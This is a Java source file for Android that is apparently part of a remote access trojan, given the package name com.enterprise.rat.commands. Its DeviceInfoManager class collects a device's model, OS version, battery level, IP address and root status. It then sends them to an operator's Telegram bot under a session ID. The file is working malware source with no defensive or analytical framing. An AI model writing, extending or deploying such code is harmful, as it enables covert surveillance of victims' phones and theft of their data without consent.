package com.enterprise.rat.commands;

import android.content.Context;
import android.os.Build;
import android.os.BatteryManager;
import com.enterprise.rat.bot.BotConfig;
import com.enterprise.rat.utils.TelegramApi;
import com.enterprise.rat.utils.NetworkUtils;

public class DeviceInfoManager {
    private Context context;

    public DeviceInfoManager(Context context) { this.context = context; }

    public void sendDeviceInfo() {
        BatteryManager bm = (BatteryManager) context.getSystemService(Context.BATTERY_SERVICE);
        int batteryLevel = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);

        StringBuilder sb = new StringBuilder();
        sb.append("<b>📱 Device Information</b>\n\n");
        sb.append("<b>Session ID:</b> <code>").append(BotConfig.SESSION_ID).append("</code>\n");
        sb.append("<b>Model:</b> ").append(Build.MANUFACTURER).append(" ").append(Build.MODEL).append("\n");
        sb.append("<b>Android OS:</b> ").append(Build.VERSION.RELEASE).append(" (API ").append(Build.VERSION.SDK_INT).append(")\n");
        sb.append("<b>Battery:</b> ").append(batteryLevel).append("%\n");
        sb.append("<b>IP Address:</b> <code>").append(NetworkUtils.getIPAddress(true)).append("</code>\n");
        sb.append("<b>Root Access:</b> ").append(isDeviceRooted() ? "✅ Yes" : "❌ No").append("\n");

        TelegramApi.sendMessage(sb.toString());
    }

    private boolean isDeviceRooted() {
        String[] paths = { "/system/app/Superuser.apk", "/sbin/su", "/system/bin/su", "/system/xbin/su" };
        for (String path : paths) {
            if (new java.io.File(path).exists()) return true;
        }
        return false;
    }
}
